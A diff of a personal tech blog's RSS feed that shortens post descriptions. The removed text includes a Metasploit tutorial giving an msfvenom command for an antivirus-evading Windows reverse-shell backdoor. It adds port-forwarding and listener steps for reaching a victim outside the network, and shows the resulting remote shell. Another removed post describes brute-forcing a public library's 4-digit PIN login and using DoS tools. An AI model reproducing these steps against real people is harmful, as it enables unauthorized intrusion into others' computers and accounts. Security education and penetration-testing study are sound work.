@@ -10,7 +10,7 @@
       <item>
         <title>Elementary OS: Replacement for Windows and OS X</title>
         
-          <description>&lt;p&gt;I’m always interested in looking at creative and primitive Linux distros, such as the simplistic &lt;b&gt;Elementary OS&lt;/b&gt;. Looking at the picture of the website:&lt;/p&gt;
+          <description>&lt;p&gt;I’m always interested in looking at creative and primitive Linux distros, such as the simplistic &lt;strong&gt;Elementary OS&lt;/strong&gt;. Looking at the picture of the website: &lt;img src=&quot;/img/Elementary/elementaryos.png&quot; alt=&quot;&quot; /&gt; it seems to show off a GNOME environment. That is where you are wrong. Instead of using &lt;strong&gt;GNOME&lt;/strong&gt;, the new OS introduces the &lt;strong&gt;Pantheon&lt;/strong&gt; desktop environment. The latest release is currently “Freya”. A lot of mythical references. Let’s take a look at this interested distro. Although quite primitive, it is starting to quite shape up, and is starting to become quite popular among Linux enthusiasts. It is being praised for its simplicity, and its user-friendliness. With Elementary OS comes the arrival of a built-in photo library application, and iTunes-like music player, video player, and &lt;strong&gt;Midori&lt;/strong&gt;, which is the fast &amp;amp; lightweight web browser. &amp;lt;&lt;/p&gt;
 
 </description>
         
@@ -25,7 +25,7 @@
       <item>
         <title>Theory and Concept of Code</title>
         
-          <description>&lt;p&gt;Many beginning programmers often miss out the several key concepts and theory that involve programming. Many people have always asked me, “coding is difficult. I’ve tried reading. I’ve tried videos. I’ve tried this $2,000,000 course that says that it guarentees that I will master &lt;i&gt;x&lt;/i&gt; language in &lt;i&gt;y&lt;/i&gt; hours. What should I do? What needs to be done? Should I learn really advanced math?”&lt;/p&gt;
+          <description>&lt;p&gt;Many beginning programmers often miss out the several key concepts and theory that involve programming. Many people have always asked me, “coding is difficult. I’ve tried reading. I’ve tried videos. I’ve tried this $2,000,000 course that says that it guarentees that I will master &lt;em&gt;x&lt;/em&gt; language in &lt;em&gt;y&lt;/em&gt; hours. What should I do? What needs to be done? Should I learn really advanced math?” In my experience, programming doesn’t require such brevity and understanding in math. Obviously, as you dive into computer science more and more, you will learn it. All you need is an &lt;strong&gt;ability&lt;/strong&gt; to understand mathematics. For example, there is a very simple method of converting a number from base 10 to base 2 (aka binary). The equation is: &lt;img src=&quot;http://www.sciweavers.org/tex2img.php?eq=V%28b%29%20%3D%20b_%7Bn-1%7D%20%2A%20%7B2%7D%5E%7Bn-1%7D%20%2B%20b_%7Bn-1%7D%20%2A%20%7B2%7D%5E%7Bn-2%7D%20%2B%20...%20b_%7B1%7D%2A2%5E%7B1%7D%2A%7Bb%7D_%7B0%7D%2B2%5E%7B0%7D%20%3D%20%0A%0A%5Csum_%7Bi%3D1%7D%5E%7Bn%7D%20x_%7Bi%7D%2A%7B2%7D%5E%7Bi%7D&amp;amp;bc=White&amp;amp;fc=Black&amp;amp;im=jpg&amp;amp;fs=12&amp;amp;ff=arev&amp;amp;edit=0&quot; alt=&quot;equation&quot; /&gt; e.g We have a binary number, 1101. In order to convert it to base 10: &lt;img src=&quot;http://bit.ly/1pSStnd&quot; alt=&quot;equation&quot; /&gt; If you were able to grasp that, then you are well on your way to becoming a proficient programmer.&lt;/p&gt;
 
 </description>
         
@@ -40,8 +40,7 @@
       <item>
         <title>Arduino - WTF is it?</title>
         
-          <description>&lt;h2&gt; What is it? &lt;/h2&gt;
-&lt;p&gt;The Arduino is an open-sourced prototype board. You use it to make projects, and is great for electronics and learning electronics. Whether it is a small blinking LED controlled by a button, or even a home automation system, the Arduino is your imagination, all stuffed into a credit card-sized blue board.&lt;/p&gt;
+          <description>&lt;h2 id=&quot;what-is-it&quot;&gt;What is it?&lt;/h2&gt;
 
 </description>
         
@@ -56,50 +55,8 @@
       <item>
         <title>Beginner&#39;s Guide to Metasploit</title>
         
-          <description>&lt;p&gt;Due to popular request, I&#39;m going to teach Metasploit.&lt;/p&gt;
-&lt;p&gt;&lt;b&gt;Metasploit&lt;/b&gt; is a pen testing framework suite written in the Ruby programming language. People use Metasploit to commonly gain access to a computer, through exploits, which find flaws, whether in the system or software the victim has and allows you to gain access.&lt;/p&gt;
-&lt;p&gt;It is pretty complicated, so I will be covering some of the essentials in a simple tutorial. 
-We will set up a basic so-called &quot;virus&quot;. Technically it’s a payload that acts as a backdoor, so that once the user executes it, you get ahold of their computer.&lt;/p&gt;
-&lt;p&gt;This tutorial will mostly base around the premise that your target is outside your network, so there is going to be a little configuration.&lt;/p&gt;
-&lt;h2 class=&quot;section-heading&quot;&gt;Installing&lt;/h2&gt;
-&lt;p&gt; If you are on Kali Linux, which is recommended, metasploit is automatically installed, as I have said before. Simply type &lt;b&gt;&quot;msfconsole&quot;&lt;/b&gt; to get started. I recommend using the Linux version. The Windows version is pretty limited and is kind of shit. If you are on Ubuntu like me, and want to install it, good luck. This was probably one of the hardest things I&#39;ve ever done. You might as well use Kali on VM if you can&#39;t install it. But if you are hardcore, click &lt;a href=&quot;http://www.darkoperator.com/installing-metasploit-in-ubunt/&quot;&gt;&lt;b&gt;Here&lt;/b&gt;&lt;/a&gt;
-&lt;h2 class=&quot;section-heading&quot;&gt;Getting Started&lt;/h2&gt;
-1. Type &quot;ifconfig&quot; in your terminal. Obtain your inet address, most likely in wlan0 or eth0 (it should be 192.168.x.x for most). This is your computers given address on your network. 
-&lt;img src=&quot;/img/BeginnersGuideToMetasploit/ifconfig.png&quot; /&gt;
-2. Open your router settings. This is achieved by typing 192.168.1.1 in your browser (search it up if it isn&#39;t it. Every router brand is different. I use a Verizon router).
-&lt;img src=&quot;/img/BeginnersGuideToMetasploit/verizonlogin.png&quot; /&gt;
-3. Find out where port forwarding is. There may be a tab called “Firewall” you might have to click. Again, all router brands are different in terms of settings and configuration, so you might have to go on the Internet and search it up. For my Verizon router, there is a tab called “Firewall”. After clicking on it, I get routed to another page, where this a tab on the side called “Port Forwarding”.
-&lt;img src=&quot;/img/BeginnersGuideToMetasploit/firewallportfor.png&quot; /&gt;
-4. Enter the IP address you had previously, the one for your computer. Port forward port “4444”. What will happen is, when you receive a request for a connection to your public IP address through port 4444, it will be rerouted to your local IP. It’s kind of like a map. Port forwarding is me building a shortcut. 
-5. In your terminal, we will make our payload. Type:
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00′ LHOST=[your PUBLIC IP] LPORT=4444 -f exe &amp;gt; payload.exe&lt;/code&gt;&lt;/pre&gt;
-Let’s break this down. &lt;b&gt;MSFvenom&lt;/b&gt; is the payload creation script (it was originally msfpayload). &lt;b&gt;–P&lt;/b&gt; is the parameter to pass that signifies what kind of payload we are creating. In this case, we are creating a &lt;b&gt;windows/meterpreter/reverse_tcp&lt;/b&gt; one. This kind of payload will create a shell called Meterpreter, which is like the Command Line, but for hackers. I’ll get to it later. &lt;b&gt;–E x86/shikata_ga_nai&lt;/b&gt; is the parameter for encoding the payload using shikata_ga_nai, where we mask it so that the victim’s anti-virus won’t detect the payload, since it is technically, a virus. Encoding a payload using MSFvenom isn’t really effective anymore, but it is for the sake of demonstration. Don’t worry, there are ways to mask payloads and bypass AV. I will talk about it later. &lt;b&gt;–I 5&lt;/b&gt; means we encode it 5 times. &lt;b&gt;–B ‘x/00’&lt;/b&gt; has something to do with shellcode, and we won’t really get into it. Now however the next part, LHOST and LPORT is important. You will enter your public IP address in LHOST. Public, not the 192.168.x.x one. Your LPORT will be 4444. This means that once the victim opens the payload, a connection will be sent to your public IP, and it will forwarded to your local IP (the 192.168.x.x one), where a listener will be set up (we will do this in the next 2 steps).
-6. After you press enter, the payload will generate. Open another terminal and type “msfconsole”. You will see an interpreter-style-thingy like this:
-&lt;img src=&quot;/img/BeginnersGuideToMetasploit/msfcli.png&quot; /&gt;
-7. After your payload is generated, it should be in your /root/ directory. Leave it where it is for now. In your terminal with Metasploit open, type 
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;b&gt;msf &amp;gt;&lt;/b&gt; use exploit/multi/handler&lt;/code&gt;&lt;/pre&gt;
-8. This is the handler that will be set up to handle the incoming request from the victim&#39;s computer. Now type in:
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;b&gt;msf exploit(handler) &amp;gt;&lt;/b&gt; set LHOST=[your LOCAL IP here]&lt;/code&gt;&lt;/pre&gt;
-9. We will establish a listener that will listen for the request. It will be hosted on your computer, hence the LOCAL IP.
-&lt;pre&gt;&lt;b&gt;msf exploit(handler) &amp;gt;&lt;/b&gt;set LPORT=4444&lt;/pre&gt;
-10. This establishes the port. Now type:
-&lt;pre&gt;&lt;b&gt;msf exploit(handler) &amp;gt;&lt;/b&gt;show options&lt;/pre&gt;
-11. Everything should be set and in place. Now type run:
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;b&gt;msf exploit(handler) &amp;gt;&lt;/b&gt;run
-12. You will see something like:
-[*]Started reverse handler on 192.168.x.x:4444
-[*]Starting the payload handler…&lt;/code&gt;&lt;/pre&gt;
-13. You have set up your handler and listener! Now in order to get a Meterpreter shell, a victim needs to open your payload. Doing so, a connection will be sent back, and your listener will intercept the connection and the handler will start a meterpreter session, which looks like:
-&lt;pre&gt;&lt;b&gt;meterpreter&amp;gt;&lt;/b&gt;&lt;/pre&gt;
-14. Congrats! You learnt the basics of Metasploit. Now you may ask, what to do with meterpreter? Well, here’s an example:
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;b&gt;meterpreter&amp;gt;&lt;/b&gt; shell
-Process 2314 created
-Channel 1 created
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation. All rights reserved.
-&lt;b&gt;C:\Windows\System32&amp;gt;&lt;/b&gt;&lt;/code&gt;&lt;/pre&gt;
+          <description>&lt;p&gt;Due to popular request, I’m going to teach Metasploit.&lt;/p&gt;
 
-&lt;/p&gt;
 </description>
         
         <pubDate>Sun, 27 Mar 2016 08:00:00 -0400</pubDate>
@@ -113,7 +70,7 @@ Copyright (c) 2009 Microsoft Corporation. All rights reserved.
       <item>
         <title>UPDATES: March 27th, 2016</title>
         
-          <description>&lt;p&gt; This site has been updated quite frequently, and I just want to give a little post as to what is up with my site, my projects, me, social media, and etc. I will do this everyone once in a while. &lt;/p&gt;
+          <description>&lt;p&gt;This site has been updated quite frequently, and I just want to give a little post as to what is up with my site, my projects, me, social media, and etc. I will do this everyone once in a while.&lt;/p&gt;
 
 </description>
         
@@ -128,23 +85,7 @@ Copyright (c) 2009 Microsoft Corporation. All rights reserved.
       <item>
         <title>Modern Encryption for the Common Alice and Bob </title>
         
-          <description>&lt;p&gt; In this part of the series, we will examine the past and the present. Today we will have a little talk about Diffie-Hellman and public key exchange. No it will not be boring. Maybe a little in the beginning, but I assure you,
-it is worth it. I will also be talking about PGP, which closely relates to the Diffie-Hellman key exchange, but in modern society. Don&#39;t worry, I won&#39;t confuse you. Please read on. &lt;/p&gt;
-&lt;h2&gt; First off... &lt;/h2&gt;
-&lt;p&gt; Let&#39;s talk encryption. We have &lt;b&gt;ciphertext&lt;/b&gt;, &lt;b&gt;cleartext&lt;/b&gt; and &lt;b&gt;the cipher &lt;/b&gt;. When we want to send someone a message but securely, we &lt;b&gt; encrypt &lt;/b&gt; it so that it appears as some sort of gibberish. &lt;b&gt; Cleartext &lt;/b&gt; is the starting point. It is the message you &lt;b&gt;WANT&lt;/b&gt; the person to send. In encryption, two people, Alice and Bob, are always used as an example (hence the series name). I guess you can call them placeholders. I&#39;m Alice. I want to send Bob a message: &quot;I&#39;m have a ton of dank weed.&quot; The message is &lt;b&gt;cleartext&lt;/b&gt;. It is in plain English. Alice uses a &lt;b&gt;cipher&lt;/b&gt;, which is a method to encrypt the cleartext, and generates &lt;b&gt;ciphertext&lt;/b&gt;. A cipher can be anything. It can be a program. It can be where I take each letter in cleartext and change it to their respective number (A = 1, B = 2, C = 3). A cipher is ideally anything is that crypts and decrypts a message. This is the basis of security and computer technology. &lt;/p&gt;
-&lt;p&gt; Well it might seem pretty simple. I can create a really complex cipher. No one will ever crack my code! But the problem is, how are you to send the cipher? In order to encode and decode, BOTH Alice and Bob has to have the cipher. That is where the problem of encrpytion comes in, and is what makes public key encryption so important today. Let&#39;s look at a scenario: &lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt; Joy is stupid. She comes up with a cipher to send to her boyfriend Tyrone that is so complex no single computer in the world could ever crack it. She emails the message that is encrypted to her B.F. But he needs the cipher. He can&#39;t read it. So she sends it as well. &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt; That&#39;s where we introduce the eavesdropper, Eve. Eve is a placeholder for anyone: a spy, the government, your nosy-ass neighbor, who has the mission of getting the cipher. Who cares if she gets the ciphertext? She can&#39;t read it, so it&#39;s useless without the cipher. That&#39;s when I introduce the Diffie-Hellman key exchange &lt;/p&gt;
-&lt;h2&gt; La clase historia &lt;/h2&gt;
-&lt;p&gt; Robert Merkle devised the earliest known methods of public-key exchange. One of them was the Diffie-Hellman key exhange, named after Whitfield Diffie and Martin Hellman, two cryptographers. The idea behind it is that Alice and Bob are able to have a shared ciphertext whereas one party does not know the cipher, let alone the other person. The catch is that this cipher can be send over an insecure, or &quot;public&quot; channel, one that Eve may be monitoring. There is obviously mathematics involved in this, but I&#39;m mostly focusing on computer technology, not math. Let us take a look. &lt;/p&gt;
-&lt;ul&gt;
-	&lt;li&gt; Alice and Bob agree on a cipher, &quot;WATER&quot;. This is known publicly, so Eve knows it as well. This is the &lt;b&gt;public key&lt;/b&gt;&lt;/li&gt;
-	&lt;li&gt; Alice and Bob each create their own &lt;b&gt;private keys&lt;/b&gt;. They don&#39;t send it to each other. Alice uses &quot;NOTEBOOK&quot;. Bob uses &quot;GLASS&quot;&lt;/li&gt;
-	&lt;li&gt;Alice uses &quot;WATER&quot; and &quot;NOTEBOOK&quot; and a message to create a ciphertext. &lt;/li&gt;
-	&lt;li&gt; She sends it through the public channel to Bob. Eve gets a copy as well. &lt;/li&gt;
-	&lt;li&gt; Bob uses his private key to decrypt the message. He responds by using &quot;WATER&quot; and &quot;GLASS&quot; to create another message and sends it to Alice. Eve also intercepts it &lt;/li&gt;
-	&lt;li&gt; Alice uses to his private key to decrypt the message. &lt;/li&gt;
-&lt;/ul&gt;
+          <description>&lt;p&gt;In this part of the series, we will examine the past and the present. Today we will have a little talk about Diffie-Hellman and public key exchange. No it will not be boring. Maybe a little in the beginning, but I assure you, it is worth it. I will also be talking about PGP, which closely relates to the Diffie-Hellman key exchange, but in modern society. Don’t worry, I won’t confuse you. Please read on.&lt;/p&gt;
 
 </description>
         
@@ -159,7 +100,7 @@ it is worth it. I will also be talking about PGP, which closely relates to the D
       <item>
         <title>Redox: a Linux-Like Operating System made with Rust</title>
         
-          <description>&lt;p&gt; Recently, I was doing my routinely performing my daily rituals on Reddit when I came across this: &lt;/p&gt;
+          <description>&lt;p&gt;Recently, I was doing my routinely performing my daily rituals on Reddit when I came across this:&lt;/p&gt;
 
 </description>
         
@@ -174,7 +115,7 @@ it is worth it. I will also be talking about PGP, which closely relates to the D
       <item>
         <title>Modern Encryption for the Common Alice and Bob</title>
         
-          <description>&lt;p&gt; Hello, everyone, I&#39;m back! &lt;/p&gt;
+          <description>&lt;p&gt;Hello, everyone, I’m back!&lt;/p&gt;
 
 </description>
         
@@ -189,30 +130,8 @@ it is worth it. I will also be talking about PGP, which closely relates to the D
       <item>
         <title>How to be the World&#39;s Best Hacktivist</title>
         
-          <description>&lt;p&gt;OK, first off, I&#39;m not from Anonymous. Of course, I respect this group for their commitment and worldwide diffusion of their hacktivist ethos.&lt;/p&gt;
-&lt;p&gt; After putting that aside, I would like to say that I am quite proud of my skill in penetration testing. I hope to have a successful career in penetration testing, computer security, and even a hacktivist at night! I also hope you the best, aspiring hacker-reader, in your journey in learning the art of hacking and intrusion. I wish to help you the best I can (Project idea: IRC?????) and spread my 4-years of learning hacking/penetration testing.&lt;/p&gt;
-&lt;h4&gt; First things first...&lt;/h4&gt;
-&lt;p&gt;Here is a nice set of morals I follow every day. I am not a black hat, nor a script kiddy, and I abide by these set of rules (which is ironic, since hackers &lt;i&gt;break&lt;/i&gt; rules. I hope that you will, with your integrity, follow mine, or even your own set of values and be truthful and live by it, like a real revolutionary hero is like.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt; Hacking isn&#39;t a superpower. It is an art, a sacred practice. I&#39;m not trying to sound like Confucius, but do not take advantage of a new profound skill, in a bad and negative way. This means &lt;b&gt;DO NOT BE A BLACKHAT!&lt;/b&gt; You are a hacktivist, a combination of hacker and activist, and as one, you are also taking upon the role of a hero, a symbol.&lt;/li&gt;
-&lt;li&gt; Hackers are creatorsYou aren&#39;t a hacker if you just learned how to deface a site, or backdoor a server. A hacker possesses many traits. Most respectable hacktivists I know are courageous, selfless, and ready to do anything for their cause. They do not give up, and with their profound skill, think outside the box. I remember one the public library&#39;s database was flawed. Not  because of a certain exploit, but a human flaw, where their password was a 4-digit PIN. Through figuring out this flaw I generated a wordlist of all 4 digit numeric characters possible (from 0000 to 9999) and once I obtained a username, was able to crack it with Burp Suite. &lt;/li&gt;
-&lt;li&gt;Don&#39;t be a script kiddy. Hackers are studious (but they do shit in school, no surprise there) and dedicate their lives to studying every aspect of computer science, programming, hacking, social engineering, electronics, etc. An example that I see A LOT is the DoS attack. Executing one is SO easy, and it requires 3 steps. 1. Get LOIC 2. Obtain the person that pissed you off on Xbox&#39;s IP through a grabber (sniffer, I guess is the &quot;politically correct term&quot;) 3. Click IMMA CHARGIN MY LASER. There, you are now a member of Anonymous because you sent a tremendous amount of data to one&#39;s router. Also, in relation to script kiddies, do not get into argument. Script Kiddy: IMMA BOOT YOUR FUCKING ASS OFF THE INTERNET. Don&#39;t fight them. Don&#39;t threaten. Reason with them, but assert yourself as a person that is smarter and more mature. &lt;/li&gt; 
- &lt;/ul&gt;
-&lt;h2&gt;Programming&lt;/h2&gt;
-&lt;p&gt; One thing people always asked me was where to start. I believe that it is up to them, but I always think that the best way was to learn the fundamentals. People always are eager to learn, and they yet end up on the wrong step of the path, and can really screw things up. You have to have a good foundation of knowledge, that makes you technical, as well as help you learn more advanced subjects faster, and more efficiently. For example, after learning python, I was able to understand code in Python, and because of this, was able to configure the source code for a pentesting tool to fit my needs. What languages do I recommend? Thanks you asking.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt; HTML - &lt;i&gt; HTML, or Hyper Text Markup Language, is the code that is used to write websites. I am currently writing this article in HTML. This is a very easy language, and I learned it not even in a week, but a few days. I learned it to write websites, but if you are wondering why it has use for hacking, it enables you to help understand the anatomy of a site more, such as when you are conducting a SQL Injection, or even just looking at a webpage to look for any vector to launch to an attack. Alongside HTML is CSS, which is used to simply make sites look pretty (like Bootstrap.css, which made this site pretty) and Javascript, which is used to add interactivity to the site, such as buttons, animations, etc.&lt;/i&gt;
-&lt;/li&gt;
-&lt;li&gt;Python - &lt;i&gt;I believe that this is the easiest and most useful programming language ever created. It is very VERY usefuland resourceful, and is &quot;batteries included&quot;, meaning that it comes with its own IDE (Integrated Development Environment). The code is very easy to learn and comprehend, and is the language recommended for all beginners.&lt;/i&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2&gt;Next...&lt;/h2&gt;
-&lt;p&gt;&lt;b&gt;READ.&lt;/b&gt;To learn, you have to learn to read. &lt;a href=&quot;texts.html&quot;&gt;Suggested Readings&lt;/a&gt; provide some of my favorite books, ones that you&#39;ll like as well. Some books on programming are there as well. There really isn&#39;t other ways to learn. If you are a visual learner, videos may work out for you, such as when I was learning code. I used both resources and it helped me effectively learn code.&lt;/p&gt;
-&lt;p&gt;C|EH, or Certified Ethical Hacker All-In-One, is a very good book for beginners that is also technical, and widely used as a textbook. It introduces you to everything basic in hacking, and with this fundamental knowledge, you can move on to more advanced things. &lt;/p&gt;
-&lt;h2&gt;After...&lt;/h2&gt;
-&lt;p&gt;Keep in mind that reading isn&#39;t the only thing you should be doing. Theory is great, but application is better. Take what you learned, and play around. Let&#39;s say I learned how to write a basic number-counting program in C++. Using my knowledge of loops and flow control, I can make more whimsical programs. Maybe I wanted to incorporate something to do with hacking. Doing a bit research on Stackexchange can help me learn about exploit building, and such. Knowledge is a great thing. This is what seperates the script kiddies and the real hackers. Hackers want to learn, and to add on to their knowledge. Script kiddies want to learn, but not for their knowledge but just for their destructive behavior. Hackers utilize this knowledge to invent. Script kiddies utilize this knowledge to fuck up. &lt;/p&gt;
-&lt;p&gt; And other thing I want to put out there: people tend to believe that if you are a hacker who uses &quot;d0xers&quot; or &quot;booters&quot; you are automatically a script kiddy. In a way that seems like it, but it goes back to the point I made about knowledge. I know MANY hackers, very prestigious ones, I have add, who utilize these &quot;unconventional&quot; tools. As long as you have an understanding of what you are doing, then it is OK. Don&#39;t get me wrong, I have a Kali Linux book that teaches you how to use LOIC. If you know what you are doing, and maybe even understand how the program is written and how to &lt;b&gt;ADD ON&lt;/b&gt; to it, it is fine. Using tools isn&#39;t a weakness. It&#39;s to help aid you in the learning process, and is the step before you learn how to write your own, etc. &lt;/p&gt;
-&lt;h2&gt;Wrap-Up&lt;/h2&gt;
-&lt;p&gt; Thank you for reading! This is my 2nd article. I do not know how many readers I have so far, but if you are sticking around to read them, thank you, and I really appreciate it. I hope this blog goes beyond a humble and measly readership and reaches a large population of people, since this is my passion, and I want to help others learn and keep informed. Stay tuned for my next article!&lt;/p&gt;
+          <description>&lt;p&gt;OK, first off, I’m not from Anonymous. Of course, I respect this group for their commitment and worldwide diffusion of their hacktivist ethos.&lt;/p&gt;
+
 </description>
         
         <pubDate>Sat, 20 Feb 2016 07:00:00 -0500</pubDate>
@@ -226,7 +145,7 @@ it is worth it. I will also be talking about PGP, which closely relates to the D
       <item>
         <title>Beginner&#39;s Guide to Clean Code</title>
         
-          <description>&lt;p&gt;What is the difference between &lt;b&gt;effective&lt;/b&gt; code and &lt;b&gt;clean&lt;/b&gt; code?&lt;/p&gt;
+          <description>&lt;p&gt;What is the difference between &lt;strong&gt;effective&lt;/strong&gt; code and &lt;strong&gt;clean&lt;/strong&gt; code?&lt;/p&gt;
 
 </description>
         
